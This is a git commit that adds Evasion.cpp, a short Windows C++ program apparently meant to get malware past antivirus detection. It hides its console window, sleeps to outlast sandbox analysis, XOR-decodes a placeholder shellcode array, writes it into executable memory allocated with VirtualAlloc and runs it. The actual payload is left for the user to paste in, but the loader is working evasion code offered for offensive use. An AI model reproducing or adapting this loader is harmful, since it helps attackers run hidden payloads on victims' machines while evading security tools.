8ee21340d1f3a8b3bcb611b95671c43770ebb5e2
Saumyajeet Das <66937297+SaumyajeetDas@users.noreply.github.com>
2021-11-02 04:26:45 +0530

    Add files via upload

---
+++ Evasion.cpp
@@ -0,0 +1,20 @@
+#include <windows.h>
+#include <iostream>
+#include<unistd.h>
+int main(int argc, char **argv) {
+
+ShowWindow(GetConsoleWindow(), SW_HIDE);
+sleep(100);
+char b[] = { Paste the XORED SHELL CODE };
+
+char c[sizeof b];
+
+for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ 'x';}
+
+void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+memcpy(exec, c, sizeof c);
+
+((void(*)())exec)();
+
+}
